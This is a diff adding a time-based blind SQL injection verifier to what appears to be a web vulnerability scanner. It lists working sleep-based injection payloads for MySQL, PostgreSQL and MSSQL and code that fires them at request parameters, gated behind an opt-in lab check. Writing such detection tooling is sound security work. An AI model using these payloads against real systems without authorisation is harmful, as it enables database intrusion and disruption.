@@ -15,6 +15,7 @@ from __future__ import annotations
 
 import difflib
 import re
+import time
 
 from ..models import Finding, Severity
 from .canary import OOBCanary
@@ -231,6 +232,70 @@ def ssti(points: list[Point], lab: LabContext) -> list[Finding]:
                         f"evaluated {_SSTI_A}*{_SSTI_B}={_SSTI_PRODUCT} in response"))
                     break   # one confirmed engine is enough for this param
     return out
+
+
+# Time-based blind SQLi payloads ({d} = delay seconds), per engine.
+_TIME_PAYLOADS = [
+    ("' AND SLEEP({d})-- ", "MySQL string"),
+    (" AND SLEEP({d})", "MySQL numeric"),
+    ("';SELECT pg_sleep({d})-- ", "PostgreSQL"),
+    ("' AND pg_sleep({d}) IS NOT NULL-- ", "PostgreSQL bool"),
+    ("';WAITFOR DELAY '0:0:{d}'-- ", "MSSQL"),
+]
+
+
+def _timed(pt: Point, param: str, value: str, lab: LabContext):
+    t0 = time.monotonic()
+    r = _send_with(pt, param, value, lab, "time-sqli")
+    return time.monotonic() - t0, r
+
+
+def time_based_sqli(points: list[Point], lab: LabContext, *, delay: float = 3.0,
+                    margin: float = 0.8) -> list[Finding]:
+    """Time-based blind SQLi: inject a SQL sleep and confirm from the RESPONSE DELAY.
+
+    SAFETY: this deliberately makes the database pause — an explicit, opt-in
+    exception to the non-destructive default (it's load-adjacent). It is never in
+    ALL_VERIFIERS; only the dedicated --time-sqli plugin runs it.
+
+    Robustness: a one-off slow response is not enough. We require the delay to
+    *scale* — a `delay`s sleep adds ~delay, and doubling it adds ~2·delay — which a
+    coincidentally-slow endpoint won't do. That two-point check is what keeps it
+    from firing on network jitter."""
+    out: list[Finding] = []
+    for pt in points:
+        for param in pt.param_names():
+            base = str(pt.params.get(param) or "1")
+            base_t, rb = _timed(pt, param, base, lab)
+            if rb is None:
+                continue
+            for tmpl, engine in _TIME_PAYLOADS:
+                ok, _why = lab.can_send()
+                if not ok:
+                    return out
+                t1, r1 = _timed(pt, param, base + tmpl.format(d=_fmt(delay)), lab)
+                if r1 is None or (t1 - base_t) < delay * margin:
+                    continue                                  # no delay -> not this engine
+                t2, r2 = _timed(pt, param, base + tmpl.format(d=_fmt(delay * 2)), lab)
+                if r2 is None:
+                    continue
+                if (t2 - base_t) >= delay * 2 * margin and (t2 - t1) >= delay * margin * 0.5:
+                    out.append(_confirm(
+                        "Blind SQL injection confirmed (time-based)", Severity.HIGH,
+                        pt, param, base + tmpl.format(d=_fmt(delay)),
+                        f"A {_fmt(delay)}s SQL sleep ({engine}) delayed the response by "
+                        f"~{t1 - base_t:.1f}s and doubling it delayed ~{t2 - base_t:.1f}s — the "
+                        "delay scales with the injected value, proving the database executes "
+                        "attacker SQL. (Time-based: deliberately pauses the DB — an opt-in "
+                        "exception to the non-destructive default.)",
+                        f"baseline {base_t:.1f}s; {_fmt(delay)}s->{t1 - base_t:.1f}s; "
+                        f"{_fmt(delay * 2)}s->{t2 - base_t:.1f}s"))
+                    break
+    return out
+
+
+def _fmt(x: float) -> str:
+    return str(int(x)) if float(x).is_integer() else f"{x:g}"
 
 
 # A uniquely-named header we try to inject via CRLF; it can only appear in a
